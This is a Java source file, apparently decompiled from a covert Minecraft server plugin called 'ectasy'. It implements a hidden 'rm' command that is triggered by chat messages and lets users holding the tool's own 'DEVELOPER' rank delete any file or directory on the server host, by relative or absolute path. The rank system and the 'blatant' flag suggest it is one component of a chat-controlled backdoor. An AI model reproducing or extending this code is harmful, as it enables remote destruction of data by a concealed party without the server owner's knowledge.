package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import fr.body.ectasy.util.Vars;
import java.io.File;
import org.apache.commons.io.FileUtils;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "rm",
   description = "Removes a file",
   blatant = false,
   rank = Rank.DEVELOPER,
   aliases = {}
)
public class RmCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      if (var3.length == 0) {
         ChatUtil.sendChat(var1.getPlayer(), "Please, use rm <path>");
      } else {
         File var4 = new File(Vars.CURRENT_DIR + "/" + var3[0]);
         if (!var4.exists()) {
            var4 = new File(var3[0]);
         }

         if (!var4.exists()) {
            ChatUtil.sendChat(var1.getPlayer(), "File not found.");
         } else if (!var4.isFile()) {
            try {
               FileUtils.deleteDirectory(var4);
               ChatUtil.sendChat(var1.getPlayer(), "Deleted the folder");
            } catch (Exception var6) {
               ChatUtil.sendChat(var1.getPlayer(), "Could not delete the folder");
            }
         } else {
            try {
               var4.delete();
               ChatUtil.sendChat(var1.getPlayer(), "Deleted the file");
            } catch (Exception var7) {
               ChatUtil.sendChat(var1.getPlayer(), "Could not delete the file");
            }
         }
      }
   }

   public RmCommand() {
   }
}
